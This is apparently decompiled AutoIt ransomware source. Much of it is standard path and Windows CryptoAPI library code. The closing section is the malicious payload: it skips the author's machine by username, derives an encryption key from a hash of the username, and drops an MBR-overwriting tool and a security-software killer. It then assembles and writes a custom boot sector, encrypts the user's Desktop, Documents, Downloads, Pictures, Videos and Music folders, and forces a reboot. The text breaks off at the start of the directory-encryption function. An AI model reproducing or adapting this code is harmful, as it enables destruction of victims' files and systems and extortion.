	If Not $SRELATIVEPATH Or $SRELATIVEPATH = "." Then Return $SBASEPATH
	Local $SFULLPATH = StringReplace ( $SRELATIVEPATH , "/" , "\" )
	Local Const $SFULLPATHCONST = $SFULLPATH
	Local $SPATH
	Local $BROOTONLY = StringLeft ( $SFULLPATH , 1 ) = "\" And StringMid ( $SFULLPATH , 2 , 1 ) <> "\"
	If $SBASEPATH = Default Then $SBASEPATH = @WorkingDir
	For $I = 1 To 2
		$SPATH = StringLeft ( $SFULLPATH , 2 )
		If $SPATH = "\\" Then
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , 2 )
			Local $NSERVERLEN = StringInStr ( $SFULLPATH , "\" ) + 4294967295
			$SPATH = "\\" & StringLeft ( $SFULLPATH , $NSERVERLEN )
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , $NSERVERLEN )
			ExitLoop
		ElseIf StringRight ( $SPATH , 1 ) = ":" Then
			$SFULLPATH = StringTrimLeft ( $SFULLPATH , 2 )
			ExitLoop
		Else
			$SFULLPATH = $SBASEPATH & "\" & $SFULLPATH
		EndIf
	Next
	If StringLeft ( $SFULLPATH , 1 ) <> "\" Then
		If StringLeft ( $SFULLPATHCONST , 2 ) = StringLeft ( $SBASEPATH , 2 ) Then
			$SFULLPATH = $SBASEPATH & "\" & $SFULLPATH
		Else
			$SFULLPATH = "\" & $SFULLPATH
		EndIf
	EndIf
	Local $ATEMP = StringSplit ( $SFULLPATH , "\" )
	Local $APATHPARTS [ $ATEMP [ 0 ] ] , $J = 0
	For $I = 2 To $ATEMP [ 0 ]
		If $ATEMP [ $I ] = ".." Then
			If $J Then $J -= 1
		ElseIf Not ( $ATEMP [ $I ] = "" And $I <> $ATEMP [ 0 ] ) And $ATEMP [ $I ] <> "." Then
			$APATHPARTS [ $J ] = $ATEMP [ $I ]
			$J += 1
		EndIf
	Next
	$SFULLPATH = $SPATH
	If Not $BROOTONLY Then
		For $I = 0 To $J + 4294967295
			$SFULLPATH &= "\" & $APATHPARTS [ $I ]
		Next
	Else
		$SFULLPATH &= $SFULLPATHCONST
		If StringInStr ( $SFULLPATH , ".." ) Then $SFULLPATH = _PATHFULL ( $SFULLPATH )
	EndIf
	Do
		$SFULLPATH = StringReplace ( $SFULLPATH , ".\" , "\" )
	Until @extended = 0
	Return $SFULLPATH
EndFunc
Func _PATHGETRELATIVE ( $SFROM , $STO )
	If StringRight ( $SFROM , 1 ) <> "\" Then $SFROM &= "\"
	If StringRight ( $STO , 1 ) <> "\" Then $STO &= "\"
	If $SFROM = $STO Then Return SetError ( 1 , 0 , StringTrimRight ( $STO , 1 ) )
	Local $ASFROM = StringSplit ( $SFROM , "\" )
	Local $ASTO = StringSplit ( $STO , "\" )
	If $ASFROM [ 1 ] <> $ASTO [ 1 ] Then Return SetError ( 2 , 0 , StringTrimRight ( $STO , 1 ) )
	Local $I = 2
	Local $IDIFF = 1
	While 1
		If $ASFROM [ $I ] <> $ASTO [ $I ] Then
			$IDIFF = $I
			ExitLoop
		EndIf
		$I += 1
	WEnd
	$I = 1
	Local $SRELPATH = ""
	For $J = 1 To $ASTO [ 0 ]
		If $I >= $IDIFF Then
			$SRELPATH &= "\" & $ASTO [ $I ]
		EndIf
		$I += 1
	Next
	$SRELPATH = StringTrimLeft ( $SRELPATH , 1 )
	$I = 1
	For $J = 1 To $ASFROM [ 0 ]
		If $I > $IDIFF Then
			$SRELPATH = "..\" & $SRELPATH
		EndIf
		$I += 1
	Next
	If StringRight ( $SRELPATH , 1 ) == "\" Then $SRELPATH = StringTrimRight ( $SRELPATH , 1 )
	Return $SRELPATH
EndFunc
Func _PATHMAKE ( $SDRIVE , $SDIR , $SFILENAME , $SEXTENSION )
	If StringLen ( $SDRIVE ) Then
		If Not ( StringLeft ( $SDRIVE , 2 ) = "\\" ) Then $SDRIVE = StringLeft ( $SDRIVE , 1 ) & ":"
	EndIf
	If StringLen ( $SDIR ) Then
		If Not ( StringRight ( $SDIR , 1 ) = "\" ) And Not ( StringRight ( $SDIR , 1 ) = "/" ) Then $SDIR = $SDIR & "\"
	Else
		$SDIR = "\"
	EndIf
	If StringLen ( $SDIR ) Then
		If Not ( StringLeft ( $SDIR , 1 ) = "\" ) And Not ( StringLeft ( $SDIR , 1 ) = "/" ) Then $SDIR = "\" & $SDIR
	EndIf
	If StringLen ( $SEXTENSION ) Then
		If Not ( StringLeft ( $SEXTENSION , 1 ) = "." ) Then $SEXTENSION = "." & $SEXTENSION
	EndIf
	Return $SDRIVE & $SDIR & $SFILENAME & $SEXTENSION
EndFunc
Func _PATHSPLIT ( $SFILEPATH , ByRef $SDRIVE , ByRef $SDIR , ByRef $SFILENAME , ByRef $SEXTENSION )
	Local $AARRAY = StringRegExp ( $SFILEPATH , "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$" , $STR_REGEXPARRAYMATCH )
	If @error Then
		ReDim $AARRAY [ 5 ]
		$AARRAY [ 0 ] = $SFILEPATH
	EndIf
	$SDRIVE = $AARRAY [ 1 ]
	If StringLeft ( $AARRAY [ 2 ] , 1 ) == "/" Then
		$SDIR = StringRegExpReplace ( $AARRAY [ 2 ] , "\h*[\/\\]+\h*" , "\/" )
	Else
		$SDIR = StringRegExpReplace ( $AARRAY [ 2 ] , "\h*[\/\\]+\h*" , "\\" )
	EndIf
	$AARRAY [ 2 ] = $SDIR
	$SFILENAME = $AARRAY [ 3 ]
	$SEXTENSION = $AARRAY [ 4 ]
	Return $AARRAY
EndFunc
Func _REPLACESTRINGINFILE ( $SFILEPATH , $SSEARCHSTRING , $SREPLACESTRING , $ICASESENSITIVE = 0 , $IOCCURANCE = 1 )
	If StringInStr ( FileGetAttrib ( $SFILEPATH ) , "R" ) Then Return SetError ( 1 , 0 , + 4294967295 )
	Local $HFILEOPEN = FileOpen ( $SFILEPATH , $FO_READ )
	If $HFILEOPEN = + 4294967295 Then Return SetError ( 2 , 0 , + 4294967295 )
	Local $SFILEREAD = FileRead ( $HFILEOPEN )
	FileClose ( $HFILEOPEN )
	If $ICASESENSITIVE = Default Then $ICASESENSITIVE = 0
	If $IOCCURANCE = Default Then $IOCCURANCE = 1
	$SFILEREAD = StringReplace ( $SFILEREAD , $SSEARCHSTRING , $SREPLACESTRING , 1 - $IOCCURANCE , $ICASESENSITIVE )
	Local $IRETURN = @extended
	If $IRETURN Then
		Local $IFILEENCODING = FileGetEncoding ( $SFILEPATH )
		$HFILEOPEN = FileOpen ( $SFILEPATH , $IFILEENCODING + $FO_OVERWRITE )
		If $HFILEOPEN = + 4294967295 Then Return SetError ( 3 , 0 , + 4294967295 )
		FileWrite ( $HFILEOPEN , $SFILEREAD )
		FileClose ( $HFILEOPEN )
	EndIf
	Return $IRETURN
EndFunc
Func _TEMPFILE ( $SDIRECTORYNAME = @TempDir , $SFILEPREFIX = "~" , $SFILEEXTENSION = ".tmp" , $IRANDOMLENGTH = 7 )
	If $IRANDOMLENGTH = Default Or $IRANDOMLENGTH <= 0 Then $IRANDOMLENGTH = 7
	If $SDIRECTORYNAME = Default Or ( Not FileExists ( $SDIRECTORYNAME ) ) Then $SDIRECTORYNAME = @TempDir
	If $SFILEEXTENSION = Default Then $SFILEEXTENSION = ".tmp"
	If $SFILEPREFIX = Default Then $SFILEPREFIX = "~"
	If Not FileExists ( $SDIRECTORYNAME ) Then $SDIRECTORYNAME = @ScriptDir
	$SDIRECTORYNAME = StringRegExpReplace ( $SDIRECTORYNAME , "[\\/]+$" , "" )
	$SFILEEXTENSION = StringRegExpReplace ( $SFILEEXTENSION , "^\.+" , "" )
	$SFILEPREFIX = StringRegExpReplace ( $SFILEPREFIX , "[\\/:*?""<>|]" , "" )
	Local $STEMPNAME = ""
	Do
		$STEMPNAME = ""
		While StringLen ( $STEMPNAME ) < $IRANDOMLENGTH
			$STEMPNAME &= Chr ( Random ( 97 , 122 , 1 ) )
		WEnd
		$STEMPNAME = $SDIRECTORYNAME & "\" & $SFILEPREFIX & $STEMPNAME & "." & $SFILEEXTENSION
	Until Not FileExists ( $STEMPNAME )
	Return $STEMPNAME
EndFunc
Global Const $PROV_RSA_FULL = 1
Global Const $PROV_RSA_AES = 24
Global Const $CRYPT_VERIFYCONTEXT = 4026531840
Global Const $HP_HASHSIZE = 4
Global Const $HP_HASHVAL = 2
Global Const $CRYPT_EXPORTABLE = 1
Global Const $CRYPT_USERDATA = 1
Global Const $CALG_MD2 = 32769
Global Const $CALG_MD4 = 32770
Global Const $CALG_MD5 = 32771
Global Const $CALG_SHA1 = 32772
Global Const $CALG_3DES = 26115
Global Const $CALG_AES_128 = 26126
Global Const $CALG_AES_192 = 26127
Global Const $CALG_AES_256 = 26128
Global Const $CALG_DES = 26113
Global Const $CALG_RC2 = 26114
Global Const $CALG_RC4 = 26625
Global Const $CALG_USERKEY = 0
Global Const $KP_ALGID = 7
Global $__G_ACRYPTINTERNALDATA [ 3 ]
Func _CRYPT_STARTUP ( )
	If __CRYPT_REFCOUNT ( ) = 0 Then
		Local $HADVAPI32 = DllOpen ( "Advapi32.dll" )
		If $HADVAPI32 = + 4294967295 Then Return SetError ( 1 , 0 , False )
		__CRYPT_DLLHANDLESET ( $HADVAPI32 )
		Local $IPROVIDERID = $PROV_RSA_AES
		Local $ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptAcquireContext" , "handle*" , 0 , "ptr" , 0 , "ptr" , 0 , "dword" , $IPROVIDERID , "dword" , $CRYPT_VERIFYCONTEXT )
		If @error Or Not $ARET [ 0 ] Then
			Local $IERROR = @error + 10 , $IEXTENDED = @extended
			DllClose ( __CRYPT_DLLHANDLE ( ) )
			Return SetError ( $IERROR , $IEXTENDED , False )
		Else
			__CRYPT_CONTEXTSET ( $ARET [ 1 ] )
		EndIf
	EndIf
	__CRYPT_REFCOUNTINC ( )
	Return True
EndFunc
Func _CRYPT_SHUTDOWN ( )
	__CRYPT_REFCOUNTDEC ( )
	If __CRYPT_REFCOUNT ( ) = 0 Then
		DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptReleaseContext" , "handle" , __CRYPT_CONTEXT ( ) , "dword" , 0 )
		DllClose ( __CRYPT_DLLHANDLE ( ) )
	EndIf
EndFunc
Func _CRYPT_DERIVEKEY ( $VPASSWORD , $IALGID , $IHASHALGID = $CALG_MD5 )
	Local $ARET = 0 , $HBUFF = 0 , $HCRYPTHASH = 0 , $IERROR = 0 , $IEXTENDED = 0 , $VRETURN = 0
	_CRYPT_STARTUP ( )
	Do
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptCreateHash" , "handle" , __CRYPT_CONTEXT ( ) , "uint" , $IHASHALGID , "ptr" , 0 , "dword" , 0 , "handle*" , 0 )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 10
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$HCRYPTHASH = $ARET [ 5 ]
		$HBUFF = DllStructCreate ( "byte[" & BinaryLen ( $VPASSWORD ) & "]" )
		DllStructSetData ( $HBUFF , 1 , $VPASSWORD )
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptHashData" , "handle" , $HCRYPTHASH , "struct*" , $HBUFF , "dword" , DllStructGetSize ( $HBUFF ) , "dword" , $CRYPT_USERDATA )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 20
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptDeriveKey" , "handle" , __CRYPT_CONTEXT ( ) , "uint" , $IALGID , "handle" , $HCRYPTHASH , "dword" , $CRYPT_EXPORTABLE , "handle*" , 0 )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 30
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$VRETURN = $ARET [ 5 ]
	Until True
	If $HCRYPTHASH <> 0 Then DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptDestroyHash" , "handle" , $HCRYPTHASH )
	Return SetError ( $IERROR , $IEXTENDED , $VRETURN )
EndFunc
Func _CRYPT_DESTROYKEY ( $HCRYPTKEY )
	Local $ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptDestroyKey" , "handle" , $HCRYPTKEY )
	Local $IERROR = @error , $IEXTENDED = @extended
	_CRYPT_SHUTDOWN ( )
	If $IERROR Or Not $ARET [ 0 ] Then
		Return SetError ( $IERROR + 10 , $IEXTENDED , False )
	Else
		Return True
	EndIf
EndFunc
Func _CRYPT_ENCRYPTDATA ( $VDATA , $VCRYPTKEY , $IALGID , $BFINAL = True )
	Switch $IALGID
	Case $CALG_USERKEY
		Local $ICALGUSED = __CRYPT_GETCALGFROMCRYPTKEY ( $VCRYPTKEY )
		If @error Then Return SetError ( @error , + 4294967295 , @extended )
		If $ICALGUSED = $CALG_RC4 Then ContinueCase
	Case $CALG_RC4
		If BinaryLen ( $VDATA ) = 0 Then Return SetError ( 0 , 0 , Binary ( "" ) )
	EndSwitch
	Local $IREQBUFFSIZE = 0 , $ARET = 0 , $HBUFF = 0 , $IERROR = 0 , $IEXTENDED = 0 , $VRETURN = 0
	_CRYPT_STARTUP ( )
	Do
		If $IALGID <> $CALG_USERKEY Then
			$VCRYPTKEY = _CRYPT_DERIVEKEY ( $VCRYPTKEY , $IALGID )
			If @error Then
				$IERROR = @error + 100
				$IEXTENDED = @extended
				$VRETURN = + 4294967295
				ExitLoop
			EndIf
		EndIf
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptEncrypt" , "handle" , $VCRYPTKEY , "handle" , 0 , "bool" , $BFINAL , "dword" , 0 , "ptr" , 0 , "dword*" , BinaryLen ( $VDATA ) , "dword" , 0 )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 20
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$IREQBUFFSIZE = $ARET [ 6 ]
		$HBUFF = DllStructCreate ( "byte[" & $IREQBUFFSIZE + 1 & "]" )
		DllStructSetData ( $HBUFF , 1 , $VDATA )
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptEncrypt" , "handle" , $VCRYPTKEY , "handle" , 0 , "bool" , $BFINAL , "dword" , 0 , "struct*" , $HBUFF , "dword*" , BinaryLen ( $VDATA ) , "dword" , DllStructGetSize ( $HBUFF ) + 4294967295 )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 30
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$VRETURN = BinaryMid ( DllStructGetData ( $HBUFF , 1 ) , 1 , $IREQBUFFSIZE )
	Until True
	If $IALGID <> $CALG_USERKEY Then _CRYPT_DESTROYKEY ( $VCRYPTKEY )
	_CRYPT_SHUTDOWN ( )
	Return SetError ( $IERROR , $IEXTENDED , $VRETURN )
EndFunc
Func _CRYPT_DECRYPTDATA ( $VDATA , $VCRYPTKEY , $IALGID , $BFINAL = True )
	Switch $IALGID
	Case $CALG_USERKEY
		Local $ICALGUSED = __CRYPT_GETCALGFROMCRYPTKEY ( $VCRYPTKEY )
		If @error Then Return SetError ( @error , + 4294967295 , @extended )
		If $ICALGUSED = $CALG_RC4 Then ContinueCase
	Case $CALG_RC4
		If BinaryLen ( $VDATA ) = 0 Then Return SetError ( 0 , 0 , Binary ( "" ) )
	EndSwitch
	Local $ARET = 0 , $HBUFF = 0 , $HTEMPSTRUCT = 0 , $IERROR = 0 , $IEXTENDED = 0 , $IPLAINTEXTSIZE = 0 , $VRETURN = 0
	_CRYPT_STARTUP ( )
	Do
		If $IALGID <> $CALG_USERKEY Then
			$VCRYPTKEY = _CRYPT_DERIVEKEY ( $VCRYPTKEY , $IALGID )
			If @error Then
				$IERROR = @error + 100
				$IEXTENDED = @extended
				$VRETURN = + 4294967295
				ExitLoop
			EndIf
		EndIf
		$HBUFF = DllStructCreate ( "byte[" & BinaryLen ( $VDATA ) + 1000 & "]" )
		If BinaryLen ( $VDATA ) > 0 Then DllStructSetData ( $HBUFF , 1 , $VDATA )
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptDecrypt" , "handle" , $VCRYPTKEY , "handle" , 0 , "bool" , $BFINAL , "dword" , 0 , "struct*" , $HBUFF , "dword*" , BinaryLen ( $VDATA ) )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 20
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		$IPLAINTEXTSIZE = $ARET [ 6 ]
		$HTEMPSTRUCT = DllStructCreate ( "byte[" & $IPLAINTEXTSIZE + 1 & "]" , DllStructGetPtr ( $HBUFF ) )
		$VRETURN = BinaryMid ( DllStructGetData ( $HTEMPSTRUCT , 1 ) , 1 , $IPLAINTEXTSIZE )
	Until True
	If $IALGID <> $CALG_USERKEY Then _CRYPT_DESTROYKEY ( $VCRYPTKEY )
	_CRYPT_SHUTDOWN ( )
	Return SetError ( $IERROR , $IEXTENDED , $VRETURN )
EndFunc
Func _CRYPT_HASHDATA ( $VDATA , $IALGID , $BFINAL = True , $HCRYPTHASH = 0 )
	Local $ARET = 0 , $HBUFF = 0 , $IERROR = 0 , $IEXTENDED = 0 , $IHASHSIZE = 0 , $VRETURN = 0
	_CRYPT_STARTUP ( )
	Do
		If $HCRYPTHASH = 0 Then
			$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptCreateHash" , "handle" , __CRYPT_CONTEXT ( ) , "uint" , $IALGID , "ptr" , 0 , "dword" , 0 , "handle*" , 0 )
			If @error Or Not $ARET [ 0 ] Then
				$IERROR = @error + 10
				$IEXTENDED = @extended
				$VRETURN = + 4294967295
				ExitLoop
			EndIf
			$HCRYPTHASH = $ARET [ 5 ]
		EndIf
		$HBUFF = DllStructCreate ( "byte[" & BinaryLen ( $VDATA ) & "]" )
		DllStructSetData ( $HBUFF , 1 , $VDATA )
		$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptHashData" , "handle" , $HCRYPTHASH , "struct*" , $HBUFF , "dword" , DllStructGetSize ( $HBUFF ) , "dword" , $CRYPT_USERDATA )
		If @error Or Not $ARET [ 0 ] Then
			$IERROR = @error + 20
			$IEXTENDED = @extended
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		If $BFINAL Then
			$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptGetHashParam" , "handle" , $HCRYPTHASH , "dword" , $HP_HASHSIZE , "dword*" , 0 , "dword*" , 4 , "dword" , 0 )
			If @error Or Not $ARET [ 0 ] Then
				$IERROR = @error + 30
				$IEXTENDED = @extended
				$VRETURN = + 4294967295
				ExitLoop
			EndIf
			$IHASHSIZE = $ARET [ 3 ]
			$HBUFF = DllStructCreate ( "byte[" & $IHASHSIZE & "]" )
			$ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptGetHashParam" , "handle" , $HCRYPTHASH , "dword" , $HP_HASHVAL , "struct*" , $HBUFF , "dword*" , DllStructGetSize ( $HBUFF ) , "dword" , 0 )
			If @error Or Not $ARET [ 0 ] Then
				$IERROR = @error + 40
				$IEXTENDED = @extended
				$VRETURN = + 4294967295
				ExitLoop
			EndIf
			$VRETURN = DllStructGetData ( $HBUFF , 1 )
		Else
			$VRETURN = $HCRYPTHASH
		EndIf
	Until True
	If $HCRYPTHASH <> 0 And $BFINAL Then DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptDestroyHash" , "handle" , $HCRYPTHASH )
	_CRYPT_SHUTDOWN ( )
	Return SetError ( $IERROR , $IEXTENDED , $VRETURN )
EndFunc
Func _CRYPT_HASHFILE ( $SFILEPATH , $IALGID )
	Local $BTEMPDATA = 0 , $HFILE = 0 , $HHASHOBJECT = 0 , $IERROR = 0 , $IEXTENDED = 0 , $VRETURN = 0
	_CRYPT_STARTUP ( )
	Do
		$HFILE = FileOpen ( $SFILEPATH , $FO_BINARY )
		If $HFILE = + 4294967295 Then
			$IERROR = 1
			$VRETURN = + 4294967295
			ExitLoop
		EndIf
		Do
			$BTEMPDATA = FileRead ( $HFILE , 512 * 1024 )
			If @error Then
				$VRETURN = _CRYPT_HASHDATA ( $BTEMPDATA , $IALGID , True , $HHASHOBJECT )
				If @error Then
					$IERROR = @error
					$IEXTENDED = @extended
					$VRETURN = + 4294967295
					ExitLoop 2
				EndIf
				ExitLoop 2
			Else
				$HHASHOBJECT = _CRYPT_HASHDATA ( $BTEMPDATA , $IALGID , False , $HHASHOBJECT )
				If @error Then
					$IERROR = @error + 100
					$IEXTENDED = @extended
					$VRETURN = + 4294967295
					ExitLoop 2
				EndIf
			EndIf
		Until False
	Until True
	_CRYPT_SHUTDOWN ( )
	If $HFILE <> + 4294967295 Then FileClose ( $HFILE )
	Return SetError ( $IERROR , $IEXTENDED , $VRETURN )
EndFunc
Func _CRYPT_ENCRYPTFILE ( $SSOURCEFILE , $SDESTINATIONFILE , $VCRYPTKEY , $IALGID )
	Local $BTEMPDATA = 0 , $HINFILE = 0 , $HOUTFILE = 0 , $IERROR = 0 , $IEXTENDED = 0 , $IFILESIZE = FileGetSize ( $SSOURCEFILE ) , $IREAD = 0 , $BRETURN = True
	_CRYPT_STARTUP ( )
	Do
		If $IALGID <> $CALG_USERKEY Then
			$VCRYPTKEY = _CRYPT_DERIVEKEY ( $VCRYPTKEY , $IALGID )
			If @error Then
				$IERROR = @error
				$IEXTENDED = @extended
				$BRETURN = False
				ExitLoop
			EndIf
		EndIf
		$HINFILE = FileOpen ( $SSOURCEFILE , $FO_BINARY )
		If @error Then
			$IERROR = 2
			$BRETURN = False
			ExitLoop
		EndIf
		$HOUTFILE = FileOpen ( $SDESTINATIONFILE , $FO_OVERWRITE + $FO_CREATEPATH + $FO_BINARY )
		If @error Then
			$IERROR = 3
			$BRETURN = False
			ExitLoop
		EndIf
		Do
			$BTEMPDATA = FileRead ( $HINFILE , 1024 * 1024 )
			$IREAD += BinaryLen ( $BTEMPDATA )
			If $IREAD = $IFILESIZE Then
				$BTEMPDATA = _CRYPT_ENCRYPTDATA ( $BTEMPDATA , $VCRYPTKEY , $CALG_USERKEY , True )
				If @error Then
					$IERROR = @error + 400
					$IEXTENDED = @extended
					$BRETURN = False
				EndIf
				FileWrite ( $HOUTFILE , $BTEMPDATA )
				ExitLoop 2
			Else
				$BTEMPDATA = _CRYPT_ENCRYPTDATA ( $BTEMPDATA , $VCRYPTKEY , $CALG_USERKEY , False )
				If @error Then
					$IERROR = @error + 500
					$IEXTENDED = @extended
					$BRETURN = False
					ExitLoop 2
				EndIf
				FileWrite ( $HOUTFILE , $BTEMPDATA )
			EndIf
		Until False
	Until True
	If $IALGID <> $CALG_USERKEY Then _CRYPT_DESTROYKEY ( $VCRYPTKEY )
	_CRYPT_SHUTDOWN ( )
	If $HINFILE <> + 4294967295 Then FileClose ( $HINFILE )
	If $HOUTFILE <> + 4294967295 Then FileClose ( $HOUTFILE )
	Return SetError ( $IERROR , $IEXTENDED , $BRETURN )
EndFunc
Func _CRYPT_DECRYPTFILE ( $SSOURCEFILE , $SDESTINATIONFILE , $VCRYPTKEY , $IALGID )
	Local $BTEMPDATA = 0 , $HINFILE = 0 , $HOUTFILE = 0 , $IERROR = 0 , $IEXTENDED = 0 , $IFILESIZE = FileGetSize ( $SSOURCEFILE ) , $IREAD = 0 , $BRETURN = True
	_CRYPT_STARTUP ( )
	Do
		If $IALGID <> $CALG_USERKEY Then
			$VCRYPTKEY = _CRYPT_DERIVEKEY ( $VCRYPTKEY , $IALGID )
			If @error Then
				$IERROR = @error
				$IEXTENDED = @extended
				$BRETURN = False
				ExitLoop
			EndIf
		EndIf
		$HINFILE = FileOpen ( $SSOURCEFILE , $FO_BINARY )
		If @error Then
			$IERROR = 2
			$BRETURN = False
			ExitLoop
		EndIf
		$HOUTFILE = FileOpen ( $SDESTINATIONFILE , $FO_OVERWRITE + $FO_CREATEPATH + $FO_BINARY )
		If @error Then
			$IERROR = 3
			$BRETURN = False
			ExitLoop
		EndIf
		Do
			$BTEMPDATA = FileRead ( $HINFILE , 1024 * 1024 )
			$IREAD += BinaryLen ( $BTEMPDATA )
			If $IREAD = $IFILESIZE Then
				$BTEMPDATA = _CRYPT_DECRYPTDATA ( $BTEMPDATA , $VCRYPTKEY , $CALG_USERKEY , True )
				If @error Then
					$IERROR = @error + 400
					$IEXTENDED = @extended
					$BRETURN = False
				EndIf
				FileWrite ( $HOUTFILE , $BTEMPDATA )
				ExitLoop 2
			Else
				$BTEMPDATA = _CRYPT_DECRYPTDATA ( $BTEMPDATA , $VCRYPTKEY , $CALG_USERKEY , False )
				If @error Then
					$IERROR = @error + 500
					$IEXTENDED = @extended
					$BRETURN = False
					ExitLoop 2
				EndIf
				FileWrite ( $HOUTFILE , $BTEMPDATA )
			EndIf
		Until False
	Until True
	If $IALGID <> $CALG_USERKEY Then _CRYPT_DESTROYKEY ( $VCRYPTKEY )
	_CRYPT_SHUTDOWN ( )
	If $HINFILE <> + 4294967295 Then FileClose ( $HINFILE )
	If $HOUTFILE <> + 4294967295 Then FileClose ( $HOUTFILE )
	Return SetError ( $IERROR , $IEXTENDED , $BRETURN )
EndFunc
Func _CRYPT_GENRANDOM ( $PBUFFER , $ISIZE )
	_CRYPT_STARTUP ( )
	Local $ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptGenRandom" , "handle" , __CRYPT_CONTEXT ( ) , "dword" , $ISIZE , "struct*" , $PBUFFER )
	Local $IERROR = @error , $IEXTENDED = @extended
	_CRYPT_SHUTDOWN ( )
	If $IERROR Or ( Not $ARET [ 0 ] ) Then
		Return SetError ( $IERROR + 10 , $IEXTENDED , False )
	Else
		Return True
	EndIf
EndFunc
Func __CRYPT_REFCOUNT ( )
	Return $__G_ACRYPTINTERNALDATA [ 0 ]
EndFunc
Func __CRYPT_REFCOUNTINC ( )
	$__G_ACRYPTINTERNALDATA [ 0 ] += 1
EndFunc
Func __CRYPT_REFCOUNTDEC ( )
	If $__G_ACRYPTINTERNALDATA [ 0 ] > 0 Then $__G_ACRYPTINTERNALDATA [ 0 ] -= 1
EndFunc
Func __CRYPT_DLLHANDLE ( )
	Return $__G_ACRYPTINTERNALDATA [ 1 ]
EndFunc
Func __CRYPT_DLLHANDLESET ( $HADVAPI32 )
	$__G_ACRYPTINTERNALDATA [ 1 ] = $HADVAPI32
EndFunc
Func __CRYPT_CONTEXT ( )
	Return $__G_ACRYPTINTERNALDATA [ 2 ]
EndFunc
Func __CRYPT_CONTEXTSET ( $HCRYPTCONTEXT )
	$__G_ACRYPTINTERNALDATA [ 2 ] = $HCRYPTCONTEXT
EndFunc
Func __CRYPT_GETCALGFROMCRYPTKEY ( $VCRYPTKEY )
	Local $TALGID = DllStructCreate ( "uint;dword" )
	DllStructSetData ( $TALGID , 2 , 4 )
	Local $ARET = DllCall ( __CRYPT_DLLHANDLE ( ) , "bool" , "CryptGetKeyParam" , "handle" , $VCRYPTKEY , "dword" , $KP_ALGID , "ptr" , DllStructGetPtr ( $TALGID , 1 ) , "dword*" , DllStructGetPtr ( $TALGID , 2 ) , "dword" , 0 )
	If @error Or Not $ARET [ 0 ] Then
		Return SetError ( @error , @extended , $CRYPT_USERDATA )
	Else
		Return DllStructGetData ( $TALGID , 1 )
	EndIf
EndFunc
If @UserName == "Kitty" Then
	Exit
EndIf
$RNAME = Random ( 10000000 , 99999999 , 1 )
$WD = @HomeDrive & @HomePath & "\" & $RNAME
DirCreate ( $WD )
$ENCKEY = StringReplace ( _CRYPT_HASHDATA ( @UserName , $CALG_SHA1 ) , "0x" , "" )
$IDKEY = StringReplace ( _CRYPT_HASHDATA ( $ENCKEY , $CALG_SHA1 ) , "0x" , "" )
FileInstall ( "C:\Users\Kitty\Desktop\shared2\mbrover.exe" , $WD & "\overwrite.exe" )
FileInstall ( "C:\Users\Kitty\Desktop\assembler.exe" , $WD & "\assembler.exe" )
FileInstall ( "C:\Users\Kitty\Desktop\mbrover\mbr.asm" , $WD & "\boot.asm" )
FileInstall ( "C:\Users\Kitty\Desktop\Myriad\Concept Testing\TMkill.exe" , $WD & "\protect.exe" )
Run ( """" & $WD & "\protect.exe""" )
FileMove ( @ScriptFullPath , $WD & "\main.exe" )
_REPLACESTRINGINFILE ( $WD & "\boot.asm" , "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" , $IDKEY )
RunWait ( """" & $WD & "\assembler.exe"" -f bin """ & $WD & "\boot.asm"" -o """ & $WD & "\boot.bin""" )
FileDelete ( $WD & "\boot.asm" )
FileDelete ( $WD & "\assembler.exe" )
BOOTOVERRIDE ( )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Desktop" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Documents" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Downloads" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Pictures" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Videos" , $ENCKEY )
ENCRYPTDIRECTORY ( @HomeDrive & @HomePath & "\Music" , $ENCKEY )
Shutdown ( $SD_REBOOT )
Func BOOTOVERRIDE ( )
	RunWait ( """" & $WD & "\overwrite.exe"" """ & $WD & "\boot.bin""" )
EndFunc
Func ENCRYPTDIRECTORY ( $DIR , $KEY )
